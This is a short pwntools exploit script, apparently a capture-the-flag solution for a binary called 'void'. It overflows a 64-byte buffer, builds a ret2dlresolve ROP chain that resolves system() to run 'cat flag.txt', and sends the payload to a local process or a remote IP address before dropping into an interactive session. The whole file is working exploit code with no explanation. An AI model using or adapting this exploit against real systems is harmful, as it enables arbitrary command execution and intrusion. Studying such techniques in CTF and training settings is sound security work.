#!/usr/bin/python2
from pwn import *
from sys import *


context.arch = "amd64"
# context.arch = "i386"
# context.log_level = 'DEBUG'

#libc = ELF('libc.so.6', checksec=False)
#libc = ELF('/usr/lib32/libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)       


e = ELF('void')

if(len(argv) == 2):
    p = connect("159.65.62.241", 30802)
else:
    p = process('void')
    # p = gdb.debug('void', cmd)


cmd = """
b *0x0000000000401140
"""
if(len(argv) == 3):
    gdb.attach(p, cmd)

sleep(0.3)

context.binary = elf = e
# print(e.address)
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["cat flag.txt"])
rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
print(rop.dump())


pload = raw_rop
print(len(pload))

# p.sendline(b"A" * 0x40 + b"B" * 8 + pload)

# p.sendline(dlresolve.payload)

p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload}))

p.interactive()
